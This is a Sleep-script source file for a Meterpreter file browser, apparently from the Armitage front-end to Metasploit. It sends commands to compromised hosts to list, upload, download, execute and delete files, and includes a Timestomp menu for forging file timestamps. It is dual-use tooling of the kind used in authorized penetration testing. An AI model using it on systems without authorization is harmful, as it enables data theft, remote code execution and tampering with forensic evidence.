#
# File Browser (for Meterpreter)
#

import table.*;
import tree.*;

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;
import javax.swing.filechooser.*;
import javax.swing.text.*;

import java.io.*;
import ui.*;

global('%files %paths %attribs');
%files = ohash();
%paths = ohash();
%attribs = ohasha();
setMissPolicy(%paths, { return [new PlainDocument]; });
setMissPolicy(%files, { return [new GenericTableModel: @("D", "Name", "Size", "Modified", "Mode"), "Name", 128]; });

sub parseListing {
	local('$model');
	$model = %files[$1];

	if ($0 eq "begin") {
		[$model clear: 128];
	}
	else if ($0 eq "end") {
		[$model fireListeners];
	}
	else if ($0 eq "update") {
		if ("*Operation failed*" iswm $2) {
			showError("$2 $+ \n\nMaybe you don't have permission to access \nthis folder? Press the Refresh button.");
		}
		else if ($2 ismatch 'Listing: (.*?)' || $2 ismatch 'No entries exist in (.*?)') {
			local('$path');
			($path) = matched();
			[%paths[$1] remove: 0, [%paths[$1] getLength]];
			[%paths[$1] insertString: 0, $path, $null];
		}
		else {
			local('$mode $size $type $last $name');
			($mode, $size, $type, $last, $name) = split('\s{2,}', $2);

			if ($size ismatch '\d+' && $name ne "." && $name ne "..") {
				[$model addEntry: %(Name => $name, D => $type, Size => iff($type eq "dir", "", $size), Modified => $last, Mode => $mode)];
			}
		}
	}
}

%handlers["ls"] = &parseListing;

# setupSizeRenderer($table, "columnname")
sub setupSizeRenderer {
	[[$1 getColumn: $2] setCellRenderer: [ATable getSizeTableRenderer]];
}

sub listDrives {
	local('$queue');
	$queue = [new armitage.ConsoleQueue: $client];
	[$model clear: 128];
	[$queue addCommand: $null, "use post/windows/gather/forensics/enum_drives"];
	[$queue addCommand: $null, "set SESSION $1"];
	[$queue addCommand: "x", "run"];
	[$queue addListener: lambda({
		local('@entries $entry $d $s $f');
		@entries = parseTextTable($3, @('Device Name.', 'Type.', 'Size .bytes..'));
		foreach $entry (@entries) {
			$d = $entry['Device Name.'];
			if ($d ismatch '....([A-Z]\\:)') {
				[$model addEntry: %(Name => matched()[0], D => "dir", Size => "", Modified => "", Mode => "")];
				$f = 1;
			}
		}

		[$refresh setEnabled: 1];
		[$model fireListeners];
		[$queue stop];
	}, \$queue, \$model, \$refresh)];
	[$refresh setEnabled: 0];
	[$queue start];
}

sub createFileBrowser {
	local('$table $tree $model $panel $split $scroll1 $sorter $up $text $fsv $chooser $upload $mkdir $refresh $top $setcwd $drives');

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	$model = %files[$1];
	$table = [new ATable: $model];
	[$table setShowGrid: 0];

        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
        [$table setRowSorter: $sorter];

	# file size column
        [$sorter setComparator: 2, {
                return long($1) <=> long($2);
        }];

	# last modified column
	[$sorter setComparator: 3, {
		return convertDate($1) <=> convertDate($2);
	}];

	[[$table getColumn: "D"] setMaxWidth: 38];

	[[$table getColumn: "D"] setCellRenderer: [ATable getFileTypeTableRenderer]];

	# make sure subsequent columns do not have an icon associated with them...
	[[$table getColumn: "Name"] setCellRenderer: [ATable getSimpleTableRenderer]];

	setupSizeRenderer($table, "Size");

	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$text = [new ATextField: %paths[$1], "", 80];
	[$text addActionListener: lambda({
		local('$dir');
		$dir = [[$1 getSource] getText];
		[$model clear: 128];
		[$model fireListeners];
		m_cmd($sid, "cd ' $+ $dir $+ '");
		m_cmd($sid, "ls");
		[[$1 getSource] setText: ""];
	}, $sid => $1, \$model)];

	# this function should be called before every browser action to keep things in sync.
	$setcwd = lambda({
		m_cmd($sid, "cd '" . [$text getText] . "'");
	}, \$text, $sid => $1, $platform => $2);	

	addMouseListener($table, lambda({
		if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
			local('$model $sel');
			$model = %files[$sid];
			$sel = [$model getSelectedValue: $table];

			[$model clear: 128];
			[$model fireListeners];

			if ("*Windows*" iswm sessionToOS($sid) && "'" !isin $sel && "'" !isin [$text getText]) {
				if ([$text getText] eq "List Drives") {
					m_cmd($sid, "cd ' $+ $sel $+ '");
				}
				else {
					m_cmd($sid, "cd '" . [$text getText] . "\\ $+ $sel $+ '");
				}
			}
			else {
				[$setcwd];
				m_cmd($sid, "cd \" $+ $sel $+ \"");
			}

			m_cmd($sid, "ls");
			[$1 consume];
		}
		else if ([$1 isPopupTrigger]) {
			local('$popup $model');
			$popup = [new JPopupMenu];
			$model = %files[$sid];
			buildFileBrowserMenu($popup, [$model getSelectedValues: $table], convertAll([$model getRows]), \$sid, \$setcwd, \$text);
			[$popup show: [$1 getSource], [$1 getX], [$1 getY]];
			[$1 consume];
		}
	}, $sid => $1, \$table, \$setcwd, \$text));
	
	$fsv = [FileSystemView getFileSystemView];
	$chooser = [$fsv getSystemIcon: [$fsv getDefaultDirectory]];
	
	$up = [new JButton: $chooser];
	#[$up setPressedIcon: 
	#	[new ImageIcon: iconToImage($chooser, 2, 2)]
	#];
	#[$up setBorder: [BorderFactory createEmptyBorder: 2, 2, 2, 8]];
	#[$up setOpaque: 0];
	#[$up setContentAreaFilled: 0];
	[$up setToolTipText: "Go up one directory"];

	[$up addActionListener: lambda({ 
		this('$last');
		if ((ticks() - $last) < 500) {
			warn("Dropping cd .. -- too fast");
			$last = ticks();
			return;
		}
		$last = ticks();

		[$model clear: 128];
		[$model fireListeners];
		if ("*Windows*" iswm sessionToOS($sid) && "'" !isin [$text getText]) {
			m_cmd($sid, "cd '" . [$text getText] . "\\..'");
		}
		else {
			[$setcwd];
			m_cmd($sid, "cd ..");
		}
		m_cmd($sid, "ls");
	}, $sid => $1, \$setcwd, \$text, \$model, \$refresh)];

	# setup the whatever it's called...

	$upload = [new JButton: "Upload..."];
	[$upload addActionListener: lambda({
		local('$file $name');
		$file = chooseFile($always => iff($client !is $mclient));
		$name = getFileName($file);
		if ($file !is $null) {
			[$setcwd];
			if ($client !is $mclient) {
				# some crazy gymnastics here due to how Sleep handles thread-safety...
				local('$closure $thread');
				$closure = lambda({
					m_cmd($sid, "upload \" $+ $file $+ \" \" $+ $name $+ \"");
				}, \$sid, \$name, \$file);
				$thread = [new armitage.ArmitageThread: $closure];

				fork({
					$file = uploadBigFile($file);
					$closure['$file'] = $file;
					[$thread start];
				}, \$file, \$thread, \$closure, \$mclient);
			}
			else {
				m_cmd($sid, "upload \" $+ $file $+ \" \" $+ $name $+ \"");
			}
		}
		# refresh?!?
	}, $sid => $1, \$setcwd)];

	$mkdir = [new JButton: "Make Directory"];
	[$mkdir addActionListener: lambda({
		local('$name');
		$name = ask("Directory name:");
		if ($name !is $null) {
			[$setcwd];
			m_cmd($sid, "mkdir \" $+ $name $+ \"");
			m_cmd($sid, "ls");
		}
		# refresh?
	}, $sid => $1, \$setcwd)];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		if ([$text getText] eq "List Drives") {
			listDrives($sid, \$model, \$refresh);
		}
		else {
			[$setcwd];
			m_cmd($sid, "ls");
		}
	}, $sid => $1, \$setcwd, \$text, \$model, \$refresh)];

	$drives = [new JButton: "List Drives"];
	[$drives addActionListener: lambda({
		listDrives($sid, \$model, \$refresh);
		[$text setText: "List Drives"];
	}, \$refresh, \$model, \$text, $sid => $1)];

	# do the overall layout...

	$top = [new JPanel];
	[$top setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	[$top setLayout: [new BorderLayout]];
	[$top add: $text, [BorderLayout CENTER]];
	[$top add: pad($up, 0, 0, 0, 4), [BorderLayout WEST]];

	[$panel add: $top, [BorderLayout NORTH]];

	if ("*win*" iswm lc(sessionPlatform($1))) {
		[$panel add: center($upload, $mkdir, $drives, $refresh), [BorderLayout SOUTH]];
	}
	else {
		[$panel add: center($upload, $mkdir, $refresh), [BorderLayout SOUTH]];
	}

	[$frame addTab: "Files $1", $panel, $null, "Files " . sessionToHost($1)];

	m_cmd($1, "ls");
}

sub convertDate {
	if ($1 ismatch '\d\d\d\d-\d\d-\d\d \d\d:\d\d:\d\d .*') {
		return parseDate('yyyy-MM-dd HH:mm:ss Z', $1);
	}
	else {
		return parseDate("EEE MMM dd HH:mm:ss Z yyyy", $1);
	}
}

# automagically store timestomp attributes...
%handlers["timestomp"] = {
	if ($0 eq "update" && $2 ismatch '([MACE].*?)\s*: (.*)') {
		local('$type $value $d');
		($type, $value) = matched();
		%attribs[["$type" trim]] = formatDate(convertDate($value), 'MM/dd/yyyy HH:mm:ss');
	}
};

sub openFileViewer {
	local('$dialog $display');
	$dialog = [new JPanel];
	[$dialog setLayout: [new BorderLayout]];
	$display = [new console.Display: $preferences];
	[$dialog add: $display, [BorderLayout CENTER]];
	[$frame addTab: "View", $dialog, $null, $null];
	return $display;
}

%handlers["cat"] = {
	this('$file @files');
	if ($0 eq "begin") {
		$file = shift(@files);
		local('$host $handle');

		# show the file
		$host = sessionToHost($1);
		[$display append: "
\c9#
\c9# $host $+ : $file
\c9#\n"];
		if ($2 !ismatch '\p{ASCII}*') {
			[$display append: "\c4This is a binary file\n"];
			# don't save binary files as the cat command doesn't preserve them
		}
		else {
			[$display append: $2];

			# save the file
			mkdir(getFileProper(dataDirectory(), "downloads", $host, $path));
			$handle = openf(">" . getFileProper(dataDirectory(), "downloads", $host, $path, $file));
			writeb($handle, $2);
			closef($handle);
		}
	}
};

sub buildFileBrowserMenu {
	# ($popup, [$model getSelectedValue: $table], @rows);
	
	# turn @rows into %(file => type)
	local('%types');
	map(lambda({ %types[$1["Name"]] = $1["D"]; }, \%types), $3);

	# need to pass current working directory, selected file, and type
	setupMenu($1, "file_browser", @($2, %types, [$text getText]));

	item($1, "View", 'V', lambda({ 
		local('$f $dir @temp $tdir');

		@temp = split('\\\\', [$text getText]);
		$dir = join("/", @temp);
		%handlers['cat']['$path'] = $dir;
		%handlers['cat']['@files'] = @();
		%handlers['cat']['$display'] = openFileViewer();

		[$setcwd];
		foreach $f ($file) {
			push(%handlers['cat']['@files'], $f);
			m_cmd($sid, "cat \" $+ $f $+ \""); 
		}
	}, $file => $2, \$sid, \%types, \$setcwd, \$text));

	item($1, "Download", 'D', lambda({ 
		local('$f $dir @temp $tdir');
		@temp = split('\\\\', [$text getText]);
		$dir = strrep(downloadDirectory(sessionToHost($sid), join("/", @temp)), "\\", "/");
		
		foreach $f ($file) {
			[$setcwd];
			if (%types[$f] eq "dir") {
				$tdir = strrep(downloadDirectory(sessionToHost($sid), join("/", @temp), $f), "\\", "/");
				m_cmd($sid, "download -r \" $+ $f $+ \" \" $+ $tdir $+ \""); 
			}
			else {
				m_cmd($sid, "download \" $+ $f $+ \" \" $+ $dir $+ \""); 
			}
		}
		showError("Downloading:\n\n" . join("\n", $file) . "\n\nUse View -> Downloads to see files");
		elog("downloaded " . join(", ", $file) . " from " . [$text getText] . " on " . sessionToHost($sid));
		fire_event_async("user_download", $sid, $file);
	}, $file => $2, \$sid, \%types, \$setcwd, \$text));

	item($1, "Execute", 'E', lambda({ 
		local('$f $args');
		[$setcwd];

		$args = ask("Arguments?");

		foreach $f ($file) {
			if ($args eq "") {
				m_cmd($sid, "execute -t -f \" $+ $f $+ \" -k"); 
			}
			else {
				$args = strrep($args, '\\', '\\\\');
				m_cmd($sid, "execute -t -f \" $+ $f $+ \" -k -a \" $+ $args $+ \""); 
			}
		}
	}, $file => $2, \$sid, \$setcwd));

	separator($1);

	# use timestomp to make sure the date/time stamp is the same. :)
	local('$t $key $value');
	$t = menu($1, "Timestomp", 'T');
	item($t, "Get MACE values", 'G', lambda({
		[$setcwd];
		m_cmd($sid, "timestomp \" $+ $f $+ \" -v");
	}, \$sid, $f => $2[0], \$setcwd));

	if (size(%attribs) > 0) {
		separator($t);

		foreach $key => $value (%attribs) {
			item($t, "Set $key to $value", $null, lambda({
				local('%switches $s $f');
				[$setcwd];
				foreach $f ($files) {
					%switches = %(Modified => '-m', Accessed => '-a', Created => '-c');
					%switches["Entry Modified"] = '-e';
					$s = %switches[$key];
					m_cmd($sid, "timestomp \" $+ $f $+ \" $s \" $+ $value $+ \"");
				}
				m_cmd($sid, "ls");
			}, $files => $2, \$sid, $key => "$key", $value => "$value", \$setcwd));
		}

		separator($t);
		item($t, "Set MACE values", 'S', lambda({
			local('$f %switches $s $cmd $key $value');
			%switches = %(Modified => '-m', Accessed => '-a', Created => '-c');
			%switches["Entry Modified"] = '-e';

			[$setcwd];

			foreach $f ($files) {
				$cmd = "timestomp \" $+ $f $+ \"";

				foreach $key => $value (%attribs) {
					$s = %switches[$key];
					$cmd = "$cmd $s \" $+ $value $+ \"";
				}

				m_cmd($sid, $cmd);
			}

			m_cmd($sid, "ls"); 
		}, $files => $2, \$sid, \$setcwd));
	}
	
	item($1, "Delete", 'l', lambda({ 
		local('$f');
		[$setcwd];
		foreach $f ($file) {
			if (%types[$f] eq "dir") {
				m_cmd($sid, "rmdir \" $+ $f $+ \""); 
			}
			else {
				m_cmd($sid, "rm \" $+ $f $+ \""); 
			}
		}
		m_cmd($sid, "ls");
	}, $file => $2, \$sid, \%types, \$setcwd));
}
 
# Buttons:
# [upload...] [make directory] 
#
